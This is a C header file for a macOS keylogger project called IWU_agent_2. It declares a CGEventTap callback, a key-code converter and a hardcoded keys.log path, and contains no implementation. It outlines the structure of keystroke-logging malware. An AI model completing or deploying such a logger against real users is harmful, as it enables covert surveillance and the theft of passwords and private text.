//
//  keylogger.h
//  IWU_agent_2
//
//  Created by Admin on 30.03.16.
//  Copyright © 2016 Admin. All rights reserved.
//

#ifndef keylogger_h
#define keylogger_h

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

FILE *logfile = NULL;
const char *logfileLocation = "/Users/admin/Desktop/IWU_agent_2/keys.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKeyCode(int);


#endif /* keylogger_h */
